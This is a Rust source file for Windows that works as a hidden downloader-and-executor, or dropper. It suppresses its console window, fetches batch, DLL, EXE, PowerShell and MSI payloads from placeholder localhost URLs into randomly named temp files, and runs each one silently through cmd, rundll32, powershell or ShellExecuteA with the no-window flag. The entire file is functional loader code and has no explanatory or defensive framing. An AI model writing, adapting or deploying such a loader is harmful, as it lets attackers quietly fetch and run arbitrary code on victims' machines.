#![windows_subsystem = "windows"]
use minreq;
use rand::Rng;
use std::env;
use std::ffi::CString;
use std::fs::File;
use std::io::BufReader;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;
use std::sync::mpsc::channel;
use std::thread;
use winapi::um::shellapi::ShellExecuteA;

fn download(url: &str, filename: &str) -> std::io::Result<String> {
    let response = minreq::get(url)
        .send()
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;

    if response.status_code != 200 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to download file",
        ));
    }

    let mut file = File::create(filename)?;
    let mut reader = BufReader::new(response.as_bytes());

    std::io::copy(&mut reader, &mut file)?;
    Ok(filename.to_owned())
}

fn execute(filename: &str, entry_point: Option<&str>) {
    let verb = CString::new("open").expect("CString::new failed");
    let file_or_url = CString::new(filename).expect("CString::new failed");

    unsafe {
        if let Some(ep) = entry_point {
            // Run DLL with rundll32.exe and specified entry point
            let rundll32 = "rundll32.exe";
            let command = format!("{} {} {}", rundll32, filename, ep);

            let status = Command::new("cmd")
                .args(&["/C", &command])
                .creation_flags(0x08000000)
                .status();

            match status {
                Ok(exit_status) => {
                    if !exit_status.success() {
                        eprintln!("Failed to execute DLL: {}", filename);
                    }
                }
                Err(err) => {
                    eprintln!("Failed to execute DLL: {}", err);
                }
            }
        } else {
            // Check if the file extension is .ps1
            if filename.ends_with(".ps1") {
                // Run .ps1 file using PowerShell
                let powershell = "powershell.exe";
                let command = format!("{} {}", powershell, filename);

                let status = Command::new("cmd")
                    .args(&["/C", &command])
                    .creation_flags(0x08000000)
                    .status();

                match status {
                    Ok(exit_status) => {
                        if !exit_status.success() {
                            eprintln!("Failed to execute PowerShell script: {}", filename);
                        }
                    }
                    Err(err) => {
                        eprintln!("Failed to execute PowerShell script: {}", err);
                    }
                }
            } else {
                // Open file directly
                ShellExecuteA(
                    std::ptr::null_mut(),
                    verb.as_ptr() as *const i8,
                    file_or_url.as_ptr() as *const i8,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    winapi::um::winuser::SW_NORMAL,
                );
            }
        }
    }
}

fn temp_filename(url: &str) -> std::io::Result<PathBuf> {
    let temp_dir = env::temp_dir();
    let url_path = PathBuf::from(url);
    let file_extension = url_path.extension().unwrap().to_str().unwrap().to_owned();

    let filename = temp_dir.join(format!(
        "downloaded_file_{:x}.{}",
        rand::thread_rng().gen::<u32>(),
        file_extension
    ));

    Ok(filename)
}

fn main() {
    let urls = vec![
        ("http://127.0.0.1/bat.bat", None),
        ("http://127.0.0.1/mydll.dll", Some("DllMain")),
        ("http://127.0.0.1/exe.exe", None),
        ("http://127.0.0.1/ps1.ps1", None),
        ("http://127.0.0.1/msi.msi", None),
    ];

    let (tx, rx) = channel();
    let urls_len = urls.len(); 

    for (url, entry_point) in urls.into_iter() {
        let tx = tx.clone();
        let filename = match temp_filename(url) {
            Ok(fname) => fname,
            Err(e) => {
                eprintln!("Failed to get temp filename: {:?}", e);
                continue;
            }
        };

        let entry_point = entry_point.map(|ep: &str| ep.to_string());

        thread::spawn(move || {
            let filename_str = match filename.to_str() {
                Some(fstr) => fstr,
                None => {
                    eprintln!("Filename contains invalid unicode.");
                    return;
                }
            };

            if let Err(e) = download(url, filename_str) {
                eprintln!("Failed to download file: {:?}", e);
                return;
            }

            tx.send((filename, entry_point)).expect("Failed to send over channel");
        });
    }

    for _ in 0..urls_len {
        if let Ok((filename, entry_point)) = rx.recv() {
            let filename_str = filename.to_str().expect("Filename is not valid Unicode");

            if let Some(ep) = entry_point {
                execute(filename_str, Some(&ep));
            } else {
                execute(filename_str, None);
            }
        } else {
            eprintln!("Failed to receive from channel");
        }
    }
}